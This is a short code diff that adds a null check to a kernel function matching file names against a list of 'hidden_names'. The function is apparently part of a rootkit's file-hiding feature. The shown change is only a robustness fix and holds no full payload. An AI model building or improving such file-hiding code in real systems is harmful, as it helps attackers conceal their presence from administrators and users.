@@ -168,6 +168,10 @@ struct hidden_names {
 bool fs_search_name(const char *name, u64 ino)
 {
 	struct hidden_names *node, *node_safe;
+	
+	if (!name)
+		return false;
+		
 	list_for_each_entry_safe (node, node_safe, &names_node, list) {
 		// This will match any string starting with pattern
 		if (!strncmp(node->name, name, strlen(node->name))) {
